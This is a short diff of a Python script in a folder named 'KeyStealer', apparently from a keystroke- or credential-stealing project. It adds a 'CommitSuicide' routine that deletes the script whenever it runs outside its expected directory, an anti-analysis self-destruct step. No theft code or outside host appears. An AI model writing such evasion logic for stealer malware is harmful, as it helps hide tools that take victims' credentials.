@@ -1,8 +1,11 @@
 import os
-p = "c:\\Users\\brads\\OneDrive\\Escritorio\\KeyStealer"
 
-def file_in_dir(path):
-    current_script = os.path.basename(__file__)
-    return os.path.exists(f"{path}\\{current_script}")
+def CommitSuicide():    
+    file_path = os.path.abspath(__file__) 
+    os.remove(file_path)
 
-print(file_in_dir(p))
+path = "c:\\Users\\brads\\OneDrive\\Escritorio\\KeyStealer"
+if __file__ == f"{path}\\{os.path.basename(__file__)}":
+    print(True)  
+else:
+    CommitSuicide()
